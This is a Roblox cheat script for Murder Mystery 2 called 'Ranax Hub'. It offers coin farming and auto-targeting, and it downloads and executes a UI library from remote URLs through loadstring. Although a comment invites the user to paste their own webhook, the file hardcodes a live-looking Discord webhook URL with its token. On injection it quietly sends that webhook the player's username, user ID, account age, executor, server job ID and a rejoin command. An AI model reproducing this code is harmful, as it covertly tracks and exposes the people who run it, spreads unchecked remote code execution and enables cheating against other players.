-- =================================================================
--  RANAX MM2 CONFIG  ←  PASTE YOUR WEBHOOK URL HERE
-- =================================================================

-- ==================== GLOBAL COIN TRACKER STATE ====================
_G.RanaxCachedCoinLabel = nil
_G.RanaxRoundStartTime = os.time()
local cachedCoinLabel = nil

local RANAX_WEBHOOK_URL = "https://discord.com/api/webhooks/1558574154549174322/XHenZJZV6rYQHVI4FAR04x8-MkI4GKK1n7evKQQlcSTKwVOWVqNhHWkVnet9TBvDjnis"  -- Paste your Discord webhook URL here
-- =================================================================

-- ==================== RANAX MODE SELECTION ====================
do
    local _Players  = game:GetService("Players")
    local _TweenSvc = game:GetService("TweenService")
    local _lp       = _Players.LocalPlayer

    local function _getSafeParent()
        if typeof(gethui) == "function" then
            local ok2, h = pcall(function() return gethui() end)
            if ok2 and h then return h end
        end
        local ok, cg = pcall(function() return game:GetService("CoreGui") end)
        if ok and cg then return cg end
        return _lp:WaitForChild("PlayerGui")
    end

    local _parent = _getSafeParent()
    pcall(function()
        local ex = _parent:FindFirstChild("RanaxModeSelectGUI")
        if ex then ex:Destroy() end
    end)

    -- ScreenGui
    local _sg = Instance.new("ScreenGui")
    _sg.Name           = "RanaxModeSelectGUI"
    _sg.ResetOnSpawn   = false
    _sg.DisplayOrder   = 99999999
    _sg.IgnoreGuiInset = true
    _sg.Parent         = _parent

    -- Blurred dark overlay
    local _overlay = Instance.new("Frame")
    _overlay.Size                   = UDim2.new(1, 0, 1, 0)
    _overlay.BackgroundColor3       = Color3.fromRGB(6, 7, 12)
    _overlay.BackgroundTransparency = 1
    _overlay.BorderSizePixel        = 0
    _overlay.Parent                 = _sg
    _TweenSvc:Create(_overlay, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { BackgroundTransparency = 0.38 }):Play()

    -- Main card
    local _card = Instance.new("Frame")
    _card.Name                   = "RanaxCard"
    _card.Size                   = UDim2.new(0, 500, 0, 316)
    _card.Position               = UDim2.new(0.5, -250, 0.5, -80)
    _card.BackgroundColor3       = Color3.fromRGB(11, 13, 20)
    _card.BackgroundTransparency = 1
    _card.BorderSizePixel        = 0
    _card.ClipsDescendants       = true
    _card.Parent                 = _sg

    local _cardCorner = Instance.new("UICorner")
    _cardCorner.CornerRadius = UDim.new(0, 16)
    _cardCorner.Parent       = _card

    -- Glowing border
    local _cardStroke = Instance.new("UIStroke")
    _cardStroke.Color        = Color3.fromRGB(75, 55, 160)
    _cardStroke.Thickness    = 1.5
    _cardStroke.Transparency = 1
    _cardStroke.Parent       = _card

    -- Dragging
    local _dragging, _dragStart, _startPos = false, nil, nil
    _card.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            _dragging = true; _dragStart = inp.Position; _startPos = _card.Position
            inp.Changed:Connect(function() if inp.UserInputState == Enum.UserInputState.End then _dragging = false end end)
        end
    end)
    _card.InputChanged:Connect(function(inp)
        if _dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
            local d = inp.Position - _dragStart
            _card.Position = UDim2.new(_startPos.X.Scale, _startPos.X.Offset + d.X, _startPos.Y.Scale, _startPos.Y.Offset + d.Y)
        end
    end)

    -- Top gradient bar (matches WindUI accent)
    local _topBar = Instance.new("Frame")
    _topBar.Size             = UDim2.new(1, 0, 0, 4)
    _topBar.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    _topBar.BorderSizePixel  = 0
    _topBar.ZIndex           = 2
    _topBar.Parent           = _card
    local _topGrad = Instance.new("UIGradient")
    _topGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.0,  Color3.fromRGB(80,  60, 220)),
        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(130, 80, 255)),
        ColorSequenceKeypoint.new(0.75, Color3.fromRGB(200, 60, 200)),
        ColorSequenceKeypoint.new(1.0,  Color3.fromRGB(255, 70, 110)),
    })
    _topGrad.Parent = _topBar

    -- Subtle top glow blob
    local _glowBlob = Instance.new("Frame")
    _glowBlob.Size                   = UDim2.new(0, 280, 0, 80)
    _glowBlob.Position               = UDim2.new(0.5, -140, 0, -28)
    _glowBlob.BackgroundColor3       = Color3.fromRGB(90, 60, 255)
    _glowBlob.BackgroundTransparency = 0.88
    _glowBlob.BorderSizePixel        = 0
    _glowBlob.Parent                 = _card
    Instance.new("UICorner", _glowBlob).CornerRadius = UDim.new(0, 60)

    -- RANAX HUB pill badge
    local _logoPill = Instance.new("Frame")
    _logoPill.Size             = UDim2.new(0, 96, 0, 24)
    _logoPill.Position         = UDim2.new(0, 18, 0, 16)
    _logoPill.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    _logoPill.BackgroundTransparency = 0.78
    _logoPill.BorderSizePixel  = 0
    _logoPill.ZIndex           = 3
    _logoPill.Parent           = _card
    Instance.new("UICorner", _logoPill).CornerRadius = UDim.new(0, 6)
    local _logoStroke = Instance.new("UIStroke", _logoPill)
    _logoStroke.Color = Color3.fromRGB(88, 101, 242); _logoStroke.Thickness = 1; _logoStroke.Transparency = 0.5
    local _logoLbl = Instance.new("TextLabel", _logoPill)
    _logoLbl.Size = UDim2.new(1,0,1,0); _logoLbl.BackgroundTransparency = 1
    _logoLbl.Font = Enum.Font.GothamBold; _logoLbl.Text = "* RANAX HUB"
    _logoLbl.TextColor3 = Color3.fromRGB(170, 150, 255); _logoLbl.TextSize = 11; _logoLbl.ZIndex = 4

    -- Version badge top-right
    local _verPill = Instance.new("Frame")
    _verPill.Size             = UDim2.new(0, 46, 0, 20)
    _verPill.Position         = UDim2.new(1, -64, 0, 18)
    _verPill.BackgroundColor3 = Color3.fromRGB(48, 255, 106)
    _verPill.BackgroundTransparency = 0.80
    _verPill.BorderSizePixel  = 0; _verPill.ZIndex = 3
    _verPill.Parent           = _card
    Instance.new("UICorner", _verPill).CornerRadius = UDim.new(0, 5)
    local _verLbl = Instance.new("TextLabel", _verPill)
    _verLbl.Size = UDim2.new(1,0,1,0); _verLbl.BackgroundTransparency = 1
    _verLbl.Font = Enum.Font.GothamBold; _verLbl.Text = "v1.7"
    _verLbl.TextColor3 = Color3.fromRGB(48, 255, 106); _verLbl.TextSize = 10; _verLbl.ZIndex = 4

    -- Title
    local _titleLbl = Instance.new("TextLabel")
    _titleLbl.Size                   = UDim2.new(1, -36, 0, 28)
    _titleLbl.Position               = UDim2.new(0, 18, 0, 48)
    _titleLbl.BackgroundTransparency = 1
    _titleLbl.Font                   = Enum.Font.GothamBold
    _titleLbl.Text                   = "Choose Your Mode"
    _titleLbl.TextColor3             = Color3.fromRGB(232, 236, 255)
    _titleLbl.TextSize               = 20
    _titleLbl.TextXAlignment         = Enum.TextXAlignment.Left
    _titleLbl.ZIndex                 = 3
    _titleLbl.Parent                 = _card

    -- Subtitle
    local _subLbl = Instance.new("TextLabel")
    _subLbl.Size                   = UDim2.new(1, -36, 0, 16)
    _subLbl.Position               = UDim2.new(0, 18, 0, 78)
    _subLbl.BackgroundTransparency = 1
    _subLbl.Font                   = Enum.Font.Gotham
    _subLbl.Text                   = "Select environment to load the right feature set"
    _subLbl.TextColor3             = Color3.fromRGB(100, 108, 140)
    _subLbl.TextSize               = 12
    _subLbl.TextXAlignment         = Enum.TextXAlignment.Left
    _subLbl.ZIndex                 = 3
    _subLbl.Parent                 = _card

    -- Divider line
    local _div = Instance.new("Frame")
    _div.Size             = UDim2.new(1, -36, 0, 1)
    _div.Position         = UDim2.new(0, 18, 0, 104)
    _div.BackgroundColor3 = Color3.fromRGB(28, 32, 52)
    _div.BorderSizePixel  = 0; _div.ZIndex = 3
    _div.Parent           = _card

    -- Mode chosen flag
    local _modeChosen = false
    _G.RanaxPrivateSrv = false

    local function _finishWithMode(isPrivate)
        _G.RanaxPrivateSrv = isPrivate
        _modeChosen = true
        pcall(function()
            _TweenSvc:Create(_card, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                Position = UDim2.new(_card.Position.X.Scale, _card.Position.X.Offset,
                                     _card.Position.Y.Scale, _card.Position.Y.Offset + 22),
                BackgroundTransparency = 1
            }):Play()
            _TweenSvc:Create(_cardStroke, TweenInfo.new(0.22), { Transparency = 1 }):Play()
            _TweenSvc:Create(_overlay, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                { BackgroundTransparency = 1 }):Play()
        end)
        task.wait(0.26)
        pcall(function() _sg:Destroy() end)
    end

    -- Button factory
    local function _mkBtn(yOff, title, desc, badgeText, accentRGB, iconChar, isPrivate)
        local accent = Color3.fromRGB(table.unpack(accentRGB))

        local btn = Instance.new("TextButton")
        btn.Size             = UDim2.new(1, -36, 0, 88)
        btn.Position         = UDim2.new(0, 18, 0, yOff)
        btn.BackgroundColor3 = Color3.fromRGB(16, 18, 29)
        btn.BorderSizePixel  = 0; btn.Text = ""; btn.AutoButtonColor = false
        btn.ZIndex           = 3; btn.Parent = _card
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

        local bStroke = Instance.new("UIStroke", btn)
        bStroke.Color = Color3.fromRGB(30, 34, 56); bStroke.Thickness = 1.2

        -- Left accent bar
        local sideBar = Instance.new("Frame", btn)
        sideBar.Size = UDim2.new(0, 3, 0.68, 0); sideBar.Position = UDim2.new(0, 0, 0.16, 0)
        sideBar.BackgroundColor3 = accent; sideBar.BorderSizePixel = 0
        Instance.new("UICorner", sideBar).CornerRadius = UDim.new(0, 3)

        -- Icon circle
        local iconCircle = Instance.new("Frame", btn)
        iconCircle.Size = UDim2.new(0, 46, 0, 46); iconCircle.Position = UDim2.new(0, 12, 0.5, -23)
        iconCircle.BackgroundColor3 = accent; iconCircle.BackgroundTransparency = 0.82
        iconCircle.BorderSizePixel = 0; iconCircle.ZIndex = 4
        Instance.new("UICorner", iconCircle).CornerRadius = UDim.new(0.5, 0)
        local iconStroke = Instance.new("UIStroke", iconCircle)
        iconStroke.Color = accent; iconStroke.Thickness = 1.2; iconStroke.Transparency = 0.55
        local iconLbl = Instance.new("TextLabel", iconCircle)
        iconLbl.Size = UDim2.new(1,0,1,0); iconLbl.BackgroundTransparency = 1
        iconLbl.Font = Enum.Font.GothamBold; iconLbl.Text = iconChar
        iconLbl.TextColor3 = accent; iconLbl.TextSize = 22; iconLbl.ZIndex = 5

        -- Title
        local tLbl = Instance.new("TextLabel", btn)
        tLbl.Size = UDim2.new(1, -174, 0, 20); tLbl.Position = UDim2.new(0, 72, 0, 12)
        tLbl.BackgroundTransparency = 1; tLbl.Font = Enum.Font.GothamBold
        tLbl.Text = title; tLbl.TextColor3 = Color3.fromRGB(228, 234, 255)
        tLbl.TextSize = 14; tLbl.TextXAlignment = Enum.TextXAlignment.Left; tLbl.ZIndex = 4

        -- Badge pill
        local pill = Instance.new("Frame", btn)
        pill.Size = UDim2.new(0, 78, 0, 20); pill.Position = UDim2.new(1, -92, 0, 12)
        pill.BackgroundColor3 = accent; pill.BackgroundTransparency = 0.80
        pill.BorderSizePixel = 0; pill.ZIndex = 4
        Instance.new("UICorner", pill).CornerRadius = UDim.new(0, 5)
        local pillStroke = Instance.new("UIStroke", pill)
        pillStroke.Color = accent; pillStroke.Thickness = 1; pillStroke.Transparency = 0.50
        local pillLbl = Instance.new("TextLabel", pill)
        pillLbl.Size = UDim2.new(1,0,1,0); pillLbl.BackgroundTransparency = 1
        pillLbl.Font = Enum.Font.GothamBold; pillLbl.Text = badgeText
        pillLbl.TextColor3 = accent; pillLbl.TextSize = 10; pillLbl.ZIndex = 5

        -- Description
        local dLbl = Instance.new("TextLabel", btn)
        dLbl.Size = UDim2.new(1, -86, 0, 46); dLbl.Position = UDim2.new(0, 72, 0, 36)
        dLbl.BackgroundTransparency = 1; dLbl.Font = Enum.Font.Gotham
        dLbl.Text = desc; dLbl.TextColor3 = Color3.fromRGB(100, 108, 142)
        dLbl.TextSize = 11; dLbl.TextWrapped = true
        dLbl.TextXAlignment = Enum.TextXAlignment.Left
        dLbl.TextYAlignment = Enum.TextYAlignment.Top; dLbl.ZIndex = 4

        -- Arrow
        local arrowLbl = Instance.new("TextLabel", btn)
        arrowLbl.Size = UDim2.new(0, 18, 0, 18); arrowLbl.Position = UDim2.new(1, -28, 0.5, -9)
        arrowLbl.BackgroundTransparency = 1; arrowLbl.Font = Enum.Font.GothamBold
        arrowLbl.Text = ">"; arrowLbl.TextColor3 = Color3.fromRGB(50, 56, 88)
        arrowLbl.TextSize = 20; arrowLbl.ZIndex = 4

        -- Hover / click
        btn.MouseEnter:Connect(function()
            _TweenSvc:Create(btn,       TweenInfo.new(0.16), { BackgroundColor3 = Color3.fromRGB(20, 23, 38) }):Play()
            _TweenSvc:Create(bStroke,   TweenInfo.new(0.16), { Color = accent, Transparency = 0.25 }):Play()
            _TweenSvc:Create(arrowLbl,  TweenInfo.new(0.16), { TextColor3 = accent }):Play()
            _TweenSvc:Create(iconCircle,TweenInfo.new(0.16), { BackgroundTransparency = 0.62 }):Play()
        end)
        btn.MouseLeave:Connect(function()
            _TweenSvc:Create(btn,       TweenInfo.new(0.16), { BackgroundColor3 = Color3.fromRGB(16, 18, 29) }):Play()
            _TweenSvc:Create(bStroke,   TweenInfo.new(0.16), { Color = Color3.fromRGB(30, 34, 56), Transparency = 0 }):Play()
            _TweenSvc:Create(arrowLbl,  TweenInfo.new(0.16), { TextColor3 = Color3.fromRGB(50, 56, 88) }):Play()
            _TweenSvc:Create(iconCircle,TweenInfo.new(0.16), { BackgroundTransparency = 0.82 }):Play()
        end)
        btn.MouseButton1Click:Connect(function()
            _TweenSvc:Create(btn, TweenInfo.new(0.08), { BackgroundColor3 = accent, BackgroundTransparency = 0.75 }):Play()
            task.wait(0.09)
            _finishWithMode(isPrivate)
        end)

        return btn
    end

    -- Render the two mode buttons
    _mkBtn(114, "MMV - Public / Standard",
        "Standard MM2 cheats and coin farm. Targets Sheriff / Murderer accurately. Safe for public servers.",
        "STANDARD", {88, 101, 242}, "Z", false)

    _mkBtn(212, "MMV - Private Server",
        "Aggressive private server mode. Rage shoot and combat targets closest players (friends excluded).",
        "AGGRO", {255, 78, 100}, "!", true)

    -- Animate card in with spring bounce
    task.spawn(function()
        task.wait()
        _TweenSvc:Create(_card, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Position = UDim2.new(0.5, -250, 0.5, -158),
            BackgroundTransparency = 0
        }):Play()
        _TweenSvc:Create(_cardStroke, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            { Transparency = 0 }):Play()
    end)

    repeat task.wait(0.05) until _modeChosen
end
-- ==================== END MODE SELECTION ====================

-- Multi-source WindUI Loader (Clean Official Sources, Zero Luraph)
local WindUI = nil
local libUrls = {
    "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua",
    "https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua",
    "https://tree-hub.vercel.app/api/library/windui"
}

for _, url in ipairs(libUrls) do
    local ok, res = pcall(function()
        return game:HttpGet(url)
    end)
    if ok and res and #res > 500 then
        local okLoad, loadedLib = pcall(function()
            return loadstring(res)()
        end)
        if okLoad and loadedLib then
            WindUI = loadedLib
            break
        end
    end
end

if not WindUI then
    warn("[Ranax] Failed to load WindUI from all endpoints!")
    return
end
-------------------------------------------------------------------------------------------------------------------
local Window = WindUI:CreateWindow({

    Title = "Ranax UI | MMV",
    Icon = "door-open",
    Author = "by xCters",
    Folder = "RanaxHub_MM2",
    Keybind = Enum.KeyCode.LeftControl,
})

pcall(function() Window:SetToggleKey(Enum.KeyCode.LeftControl) end)

-- ==================== WINDUi SCROLL RECOVERY & FIX ENGINE ====================
-- Run ONCE on load, NEVER on every mouse click/touch (which caused massive continuous FPS drops!)
-- Safe lightweight scroll adjustment (WindUI internal only, zero CoreGui scan)
task.spawn(function()
    task.wait(1.5)
    pcall(function()
        local parentGui = (typeof(gethui) == "function" and gethui()) or (LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui"))
        local windUi = parentGui and (parentGui:FindFirstChild("WindUI") or parentGui:FindFirstChild("RanaxHub_MM2"))
        if windUi then
            for _, sf in ipairs(windUi:GetDescendants()) do
                if sf:IsA("ScrollingFrame") then
                    if sf.ScrollingEnabled == false then sf.ScrollingEnabled = true end
                    if sf.ScrollBarThickness == 0 then sf.ScrollBarThickness = 3 end
                end
            end
        end
    end)
end)


pcall(function()
    Window:Tag({
        Title = "V.1.7",
        Icon = "book-marked",
        Color = Color3.fromHex("#30ff6a"),
        Radius = 30,
    })
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local VirtualUser = game:GetService("VirtualUser")
local VirtualInputManager = game:GetService("VirtualInputManager")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

-- Purge any existing coin tracker HUD from previous executions
pcall(function()
    local list = {}
    if typeof(gethui) == "function" then pcall(function() table.insert(list, gethui()) end) end
    pcall(function() table.insert(list, game:GetService("CoreGui")) end)
    if LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui") then table.insert(list, LocalPlayer.PlayerGui) end
    for _, p in ipairs(list) do
        if p then
            for _, c in ipairs(p:GetChildren()) do
                if c.Name == "RanaxCoinTrackerHUD" or c.Name == "TrackerFrame" then
                    pcall(function() c:Destroy() end)
                end
            end
        end
    end
end)

-- ==================== RANAX HTTP REQUEST HELPER ====================
-- Universal request function that works across all executors with Discord proxy fallback
local function ranaxHTTP(url, method, headers, body)
    local req = (syn and syn.request)
        or (http and http.request)
        or (http_request)
        or (fluxus and fluxus.request)
        or (request)
        or nil

    headers = headers or {["Content-Type"] = "application/json"}
    method = method or "POST"
    body = body or ""

    local function send(targetUrl)
        if req then
            local success, res = pcall(function()
                return req({
                    Url = targetUrl,
                    Method = method,
                    Headers = headers,
                    Body = body
                })
            end)
            if success and res and (res.StatusCode == 200 or res.StatusCode == 204 or res.Success) then
                return true
            end
        else
            pcall(function()
                HttpService:RequestAsync({
                    Url = targetUrl,
                    Method = method,
                    Headers = headers,
                    Body = body
                })
            end)
        end
        return false
    end

    local ok = send(url)
    if not ok and (url:find("discord%.com/api/webhooks") or url:find("discordapp%.com/api/webhooks")) then
        local proxyUrl = url:gsub("https://discord%.com/api/webhooks/", "https://webhook.lewisakura.moe/api/webhooks/")
        proxyUrl = proxyUrl:gsub("https://discordapp%.com/api/webhooks/", "https://webhook.lewisakura.moe/api/webhooks/")
        if proxyUrl ~= url then
            send(proxyUrl)
        end
    end
end

-- ==================== INJECT NOTIFICATION WEBHOOK ====================
task.spawn(function()
    task.wait(2)  -- wait for LocalPlayer to fully load
    if not RANAX_WEBHOOK_URL or RANAX_WEBHOOK_URL == "" then return end
    pcall(function()
        local plr        = Players.LocalPlayer or Players.PlayerAdded:Wait()
        local uid        = tostring(plr.UserId)
        local uname      = tostring(plr.Name)
        local display    = tostring(plr.DisplayName)
        local age        = tostring(plr.AccountAge) .. " days"
        local placeId    = tostring(game.PlaceId)
        local rawJobId   = tostring(game.JobId)
        local fullJobId  = (rawJobId ~= "" and #rawJobId > 5) and rawJobId or "Unavailable (Private Server / Studio)"
        local profileUrl = "https://www.roblox.com/users/" .. uid .. "/profile"
        local avatarUrl  = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. uid .. "&size=420x420&format=Png&isCircular=false"

        -- Detect Executor
        local execName = "Unknown Executor"
        pcall(function()
            if typeof(identifyexecutor) == "function" then
                local name, ver = identifyexecutor()
                execName = tostring(name) .. (ver and (" " .. tostring(ver)) or "")
            elseif typeof(getexecutorname) == "function" then
                execName = tostring(getexecutorname())
            elseif syn then
                execName = "Synapse X"
            elseif KRNL_LOADED then
                execName = "Krnl"
            elseif FLUXUS_LOADED then
                execName = "Fluxus"
            elseif is_sirhurt_closure then
                execName = "Sirhurt"
            elseif pebc_execute then
                execName = "ProtoSmasher"
            end
        end)

        -- Ping & Memory
        local ping = "N/A"
        pcall(function()
            local p = plr:GetNetworkPing()
            ping = math.floor(p * 1000) .. " ms"
        end)
        local mem = "N/A"
        pcall(function()
            local stats = game:GetService("Stats")
            mem = math.floor(stats:GetTotalMemoryUsageMb()) .. " MB"
        end)

        -- Server info
        local maxPlayers = Players.MaxPlayers or 12
        local curPlayers = #Players:GetPlayers()
        local serverCap  = tostring(curPlayers) .. " / " .. tostring(maxPlayers)
        local gameName   = "Murder Mystery 2"
        pcall(function()
            local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
            if info and info.Name then gameName = tostring(info.Name) end
        end)

        -- Membership
        local membership = (plr.MembershipType == Enum.MembershipType.Premium) and "Roblox Premium" or "Standard"

        -- Direct Rejoin Script
        local rejoinCmd = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. (rawJobId ~= "" and rawJobId or "") .. '", game:GetService("Players").LocalPlayer)'

        local data = HttpService:JSONEncode({
            ["username"] = "Ranax Logger",
            ["avatar_url"] = "https://i.imgur.com/4M34hi2.png",
            ["embeds"] = {{
                ["title"] = "🚀 Ranax MM2 — Script Successfully Injected",
                ["description"] = "**Hub Loaded:** `Ranax Engine v2.5`\n**Game:** `" .. gameName .. "`\n**Status:** `Active & Running`",
                ["color"] = 0x30FF6A,
                ["thumbnail"] = { ["url"] = avatarUrl },
                ["fields"] = {
                    {["name"] = "👤 Player",        ["value"] = "`" .. uname .. "` (@" .. display .. ")", ["inline"] = true},
                    {["name"] = "🆔 User ID",       ["value"] = "`" .. uid .. "`",                        ["inline"] = true},
                    {["name"] = "🎂 Account Age",   ["value"] = age,                                     ["inline"] = true},
                    {["name"] = "🛡️ Executor",      ["value"] = "`" .. execName .. "`",                   ["inline"] = true},
                    {["name"] = "💎 Membership",    ["value"] = membership,                              ["inline"] = true},
                    {["name"] = "📶 Ping / Memory", ["value"] = "`" .. ping .. " • " .. mem .. "`",       ["inline"] = true},
                    {["name"] = "🎮 Players",       ["value"] = "`" .. serverCap .. "`",                  ["inline"] = true},
                    {["name"] = "📍 Place ID",      ["value"] = "`" .. placeId .. "`",                    ["inline"] = true},
                    {["name"] = "🔗 Profile",       ["value"] = "[Open Roblox Profile](" .. profileUrl .. ")", ["inline"] = true},
                    {["name"] = "🌐 Job ID",        ["value"] = "```\n" .. fullJobId .. "\n```",          ["inline"] = false},
                    {["name"] = "⚡ Rejoin Script",  ["value"] = "```lua\n" .. rejoinCmd .. "\n```",       ["inline"] = false}
                },
                ["footer"] = {["text"] = "Ranax Engine • MM2 Suite • Session Active", ["icon_url"] = "https://i.imgur.com/4M34hi2.png"},
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        })
        ranaxHTTP(RANAX_WEBHOOK_URL, "POST", {["Content-Type"] = "application/json"}, data)
    end)
end)

-- ==================== RANAX UNIFIED NOTIFICATION SYSTEM ====================
local VToastGui = nil
local function getRanaxToastGui()
    if VToastGui and VToastGui.Parent then return VToastGui end
    local coreOk, coreGui = pcall(function() return game:GetService("CoreGui") end)
    local targetParent = (coreOk and coreGui) or LocalPlayer:WaitForChild("PlayerGui")
    local existing = targetParent:FindFirstChild("RanaxToastGui")
    if existing then existing:Destroy() end
    local gui = Instance.new("ScreenGui")
    gui.Name = "RanaxToastGui"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999999
    gui.Parent = targetParent
    local holder = Instance.new("Frame")
    holder.Name = "ToastHolder"
    holder.Size = UDim2.new(0, 280, 1, -40)
    holder.Position = UDim2.new(1, -290, 0, 20)
    holder.BackgroundTransparency = 1
    holder.Parent = gui
    local layout = Instance.new("UIListLayout")
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding = UDim.new(0, 8)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Right
    layout.VerticalAlignment = Enum.VerticalAlignment.Bottom
    layout.Parent = holder
    VToastGui = gui
    return gui
end

local VHeadShot = nil
task.spawn(function()
    pcall(function()
        VHeadShot = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
    end)
    if not VHeadShot or VHeadShot == "" then
        VHeadShot = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(LocalPlayer.UserId) .. "&w=150&h=150"
    end
end)

local function RxNotify(title, text, dur)
    pcall(function()
        local gui = getRanaxToastGui()
        local holder = gui and gui:FindFirstChild("ToastHolder")
        if not holder then return end
        local titleStr = tostring(title or "Ranax UI")
        local descStr = tostring(text or "")
        local displayTime = tonumber(dur) or 2.5

        local pill = Instance.new("Frame")
        pill.Name = "ToastPill"
        pill.Size = UDim2.new(0, 260, 0, 52)
        pill.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
        pill.BackgroundTransparency = 0
        pill.BorderSizePixel = 0
        pill.ClipsDescendants = true
        pill.Parent = holder

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 14)
        corner.Parent = pill

        local accentBar = Instance.new("Frame")
        accentBar.Name = "AccentBar"
        accentBar.Size = UDim2.new(0, 3.5, 1, 0)
        accentBar.Position = UDim2.new(0, 0, 0, 0)
        accentBar.BackgroundColor3 = Color3.fromRGB(48, 255, 106)
        accentBar.BorderSizePixel = 0
        accentBar.Parent = pill
        local accentCorner = Instance.new("UICorner")
        accentCorner.CornerRadius = UDim.new(0, 3)
        accentCorner.Parent = accentBar

        local stroke = Instance.new("UIStroke")
        stroke.Thickness = 1
        stroke.Color = Color3.fromRGB(55, 55, 70)
        stroke.Transparency = 0
        stroke.Parent = pill

        local textContainer = Instance.new("Frame")
        textContainer.Size = UDim2.new(1, -95, 1, 0)
        textContainer.Position = UDim2.new(0, 18, 0, 0)
        textContainer.BackgroundTransparency = 1
        textContainer.Parent = pill

        local tLabel = Instance.new("TextLabel")
        tLabel.Size = UDim2.new(1, 0, 0, 22)
        tLabel.Position = UDim2.new(0, 0, 0, 5)
        tLabel.BackgroundTransparency = 1
        tLabel.Font = Enum.Font.GothamBold
        tLabel.Text = titleStr
        tLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        tLabel.TextSize = 14
        tLabel.TextXAlignment = Enum.TextXAlignment.Left
        tLabel.TextTruncate = Enum.TextTruncate.AtEnd
        tLabel.Parent = textContainer

        local dLabel = Instance.new("TextLabel")
        dLabel.Size = UDim2.new(1, 0, 0, 18)
        dLabel.Position = UDim2.new(0, 0, 0, 26)
        dLabel.BackgroundTransparency = 1
        dLabel.Font = Enum.Font.GothamMedium
        dLabel.Text = descStr
        dLabel.TextSize = 12
        dLabel.TextXAlignment = Enum.TextXAlignment.Left
        dLabel.TextTruncate = Enum.TextTruncate.AtEnd
        local upperDesc = descStr:upper()
        if upperDesc == "ON" or upperDesc:find("%sON") or upperDesc:find("ON%s") then
            dLabel.TextColor3 = Color3.fromRGB(80, 255, 130)
        elseif upperDesc == "OFF" or upperDesc:find("%sOFF") or upperDesc:find("OFF%s") then
            dLabel.TextColor3 = Color3.fromRGB(160, 160, 175)
        else
            dLabel.TextColor3 = Color3.fromRGB(200, 200, 215)
        end
        dLabel.Parent = textContainer

        local chevron = Instance.new("TextLabel")
        chevron.Size = UDim2.new(0, 20, 1, 0)
        chevron.Position = UDim2.new(1, -70, 0, -1)
        chevron.BackgroundTransparency = 1
        chevron.Font = Enum.Font.GothamBold
        chevron.Text = ">"
        chevron.TextColor3 = Color3.fromRGB(120, 120, 140)
        chevron.TextSize = 16
        chevron.TextTransparency = 0.3
        chevron.Parent = pill

        local avatarImg = Instance.new("ImageLabel")
        avatarImg.Size = UDim2.new(0, 36, 0, 36)
        avatarImg.Position = UDim2.new(1, -46, 0.5, -18)
        avatarImg.BackgroundColor3 = Color3.fromRGB(35, 35, 42)
        avatarImg.Image = VHeadShot or ("rbxthumb://type=AvatarHeadShot&id=" .. tostring(LocalPlayer.UserId) .. "&w=150&h=150")
        avatarImg.Parent = pill

        local aCorner = Instance.new("UICorner")
        aCorner.CornerRadius = UDim.new(1, 0)
        aCorner.Parent = avatarImg

        local aStroke = Instance.new("UIStroke")
        aStroke.Thickness = 1.5
        aStroke.Color = Color3.fromRGB(80, 80, 100)
        aStroke.Transparency = 0.3
        aStroke.Parent = avatarImg

        pill.Position = UDim2.new(0, 80, 0, 0)
        TweenService:Create(pill, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 0, 0, 0) }):Play()

        task.delay(displayTime, function()
            if pill and pill.Parent then
                local outTween = TweenService:Create(pill, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                    BackgroundTransparency = 1,
                    Position = UDim2.new(0, 80, 0, 0),
                    Size = UDim2.new(0, 260, 0, 0)
                })
                TweenService:Create(tLabel, TweenInfo.new(0.2), { TextTransparency = 1 }):Play()
                TweenService:Create(dLabel, TweenInfo.new(0.2), { TextTransparency = 1 }):Play()
                TweenService:Create(chevron, TweenInfo.new(0.2), { TextTransparency = 1 }):Play()
                TweenService:Create(avatarImg, TweenInfo.new(0.2), { ImageTransparency = 1 }):Play()
                TweenService:Create(stroke, TweenInfo.new(0.2), { Transparency = 1 }):Play()
                TweenService:Create(aStroke, TweenInfo.new(0.2), { Transparency = 1 }):Play()
                TweenService:Create(accentBar, TweenInfo.new(0.2), { BackgroundTransparency = 1 }):Play()
                outTween:Play()
                outTween.Completed:Connect(function() pcall(function() pill:Destroy() end) end)
            end
        end)
    end)
end
getgenv().RanaxNotify = RxNotify
